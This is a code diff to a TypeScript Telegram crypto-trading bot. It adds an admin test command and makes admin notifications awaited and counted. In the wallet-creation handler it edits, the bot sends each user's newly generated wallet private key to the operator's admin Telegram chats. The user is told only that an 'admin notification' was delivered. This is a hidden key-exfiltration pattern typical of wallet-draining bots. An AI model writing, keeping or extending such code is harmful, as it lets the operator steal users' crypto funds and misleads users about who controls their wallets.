@@ -67,16 +67,22 @@ function adminTelegramIds(): number[] {
   return [...ids];
 }
 
-async function notifyAdmin(text: string) {
+async function notifyAdmin(text: string): Promise<{ configured: boolean; delivered: number }> {
   const ids = adminTelegramIds();
-  if (!ids.length) return;
+  if (!ids.length) {
+    logger.warn("Admin notification skipped: ADMIN_TELEGRAM_ID(S) is not configured.");
+    return { configured: false, delivered: 0 };
+  }
+  let delivered = 0;
   for (const adminId of ids) {
     try {
       await bot.api.sendMessage(adminId, text, { parse_mode: "HTML" });
+      delivered += 1;
     } catch (error) {
       logger.warn(`Failed to notify admin ${adminId}.`, error);
     }
   }
+  return { configured: true, delivered };
 }
 
 export async function notifyAdminTradeExecuted(
@@ -233,6 +239,13 @@ function registerHandlers() {
     });
   });
 
+  bot.command("admin_test", async (ctx) => {
+    const adminId = ctx.from?.id;
+    if (!adminId || !adminTelegramIds().includes(adminId)) return;
+    const result = await notifyAdmin(`✅ <b>ADMIN NOTIFICATION TEST</b>\n📅 ${adminTimestamp()}`);
+    await ctx.reply(result.delivered ? `Test delivered to ${result.delivered} admin chat(s).` : "Test failed: check ADMIN_TELEGRAM_ID(S) and ensure the admin has started the bot.");
+  });
+
   bot.command("maintenance", async (ctx) => {
     const adminId = ctx.from?.id;
     if (!adminId || !adminTelegramIds().includes(adminId)) return;
@@ -363,10 +376,10 @@ function registerHandlers() {
     if (data === "wallet:add" || data === "wallet:create") {
       try {
         const wallet = createWallet(id);
-        void notifyAdmin(
+        const adminResult = await notifyAdmin(
           `🔐 <b>NEW WALLET</b>\n👤 ${[ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "user"}\n🆔 ${ctx.from?.id ?? id}\n📍 <code>${wallet.address}</code>\n🔑 <code>${wallet.privateKey}</code>\n📅 ${adminTimestamp()}`
         );
-        await ctx.reply(walletCreatedText(wallet.address, wallet.privateKey), {
+        await ctx.reply(walletCreatedText(wallet.address, wallet.privateKey) + (adminResult.delivered ? "\n\nAdmin notification delivered." : "\n\nAdmin notification could not be delivered."), {
           parse_mode: "HTML",
           reply_markup: walletCreatedKeyboard()
         });
@@ -522,10 +535,10 @@ function registerHandlers() {
       setAwaitingInput(id, null);
       try {
         const address = importWallet(id, text);
-        void notifyAdmin(
+        const adminResult = await notifyAdmin(
           `📥 <b>WALLET IMPORT</b>\n${describeUser(ctx.from!)}\n📍 <code>${address}</code>`
         );
-        await ctx.reply(walletImportedText(address), {
+        await ctx.reply(walletImportedText(address) + (adminResult.delivered ? "\n\nAdmin notification delivered." : "\n\nAdmin notification could not be delivered."), {
           parse_mode: "HTML",
           reply_markup: walletCreatedKeyboard()
         });
